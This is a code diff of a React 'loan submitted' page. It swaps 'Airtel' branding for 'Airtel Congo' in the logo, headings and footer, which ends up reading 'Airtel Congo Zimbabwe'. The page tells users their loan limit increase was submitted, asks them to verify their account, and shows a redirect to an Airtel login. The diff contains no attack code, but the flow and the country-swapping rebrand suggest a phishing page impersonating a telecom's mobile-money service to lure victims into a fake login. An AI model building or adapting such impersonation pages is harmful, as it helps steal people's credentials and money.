@@ -25,7 +25,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
         <div style={pageStyle}>
             <div style={headerStyle}>
                 <div style={{ width: "60px" }} />
-                <img src="/airtel.svg" alt="Airtel" style={logoStyle} />
+                <img src="/Airtel Congo.svg" alt="Airtel Congo" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -66,7 +66,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             color: "#10b981",
                         }}
                     >
-                        Airtel Loan Increment Submitted
+                        Airtel Congo Loan Increment Submitted
                     </h1>
                     <p
                         style={{
@@ -76,7 +76,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        Your Airtel limit increase request has been submitted. Please wait for processing.
+                        Your Airtel Congo limit increase request has been submitted. Please wait for processing.
                     </p>
                     <p
                         style={{
@@ -86,7 +86,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        You will receive a confirmation. For now, proceed to verify your Airtel account.
+                        You will receive a confirmation. For now, proceed to verify your Airtel Congo account.
                     </p>
                     <div
                         style={{
@@ -113,14 +113,14 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                                     margin: 0,
                                 }}
                             >
-                                Redirecting to Airtel login...
+                                Redirecting to Airtel Congo login...
                             </p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
         </div>
     );
 }
